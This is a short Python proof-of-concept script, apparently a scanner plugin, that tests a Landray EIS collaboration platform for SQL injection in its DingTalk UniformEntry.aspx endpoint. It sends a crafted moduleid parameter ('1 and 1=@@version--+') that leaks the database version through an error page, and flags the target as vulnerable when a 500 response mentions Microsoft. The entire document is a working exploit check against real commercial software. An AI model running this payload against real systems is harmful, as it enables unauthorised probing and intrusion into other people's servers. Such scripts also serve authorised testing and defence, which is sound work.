import requests
import urllib

def verify(url):
    relsult = {
        'name': '蓝凌EIS智慧协同平台UniformEntry.aspx接口SQL注入',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        'Connection': 'close'
    }
    vurl = urllib.parse.urljoin(url, "/third/DingTalk/Pages/UniformEntry.aspx?moduleid=1%20and%201=@@version--+")
    try:
        response = requests.get(vurl, headers=headers)
        if response.status_code == 500 and 'Microsoft' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult